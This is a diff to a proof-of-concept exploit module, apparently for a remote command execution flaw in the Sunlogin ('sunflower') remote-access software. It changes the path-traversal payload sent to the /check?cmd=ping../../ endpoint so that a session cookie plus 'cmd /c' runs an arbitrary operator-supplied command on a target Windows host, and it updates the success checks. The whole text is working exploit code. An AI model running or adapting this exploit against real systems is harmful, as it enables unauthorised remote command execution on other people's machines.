@@ -50,13 +50,13 @@ class sunflower_RCE_POC(POCBase):
 
         if r.status_code == 200 and "verify_string" in r.text:
             #path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+Warin9_0"
-            path = "/check?cmd=ping../../../../../../../../../windows/system32/tasklist"
+            path = "/check?cmd=ping../../../../../../../../../windows/system32/cmd+/c|cmd+/c+echo+Warin9_0"
             vul_url = urljoin(url, path)
             header = {
                 "Cookie": "{}".format("CID=" + verify_string)
             }
             r = requests.get(vul_url, headers=header, timeout=self.timeout, verify=False)
-            if "PID" in r.text and "failed" not in r.text:
+            if "Warin9_0" in r.text and "failed" not in r.text:
                 return vul_url, header
         return False
 
@@ -75,12 +75,12 @@ class sunflower_RCE_POC(POCBase):
         p = self._check(self.url)
         if p:
             cmd = self.get_option("command")
-            path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+"
+            path = "/check?cmd=ping../../../../../../../../../windows/system32/cmd+/c|cmd+/c+"
             vul_url = urljoin(self.url, path + cmd)
             header = p[1]
             #print(header)
             r = requests.get(vul_url, headers=header, timeout=30, verify=False)
-            if "PID" in r.text and "failed" not in r.text:
+            if r.status_code == 200 and "failed" not in r.text:
                 result['VerifyInfo'] = {}
                 #result['VerifyInfo']['URL'] = vul_url
                 #result['VerifyInfo']['Header'] = header
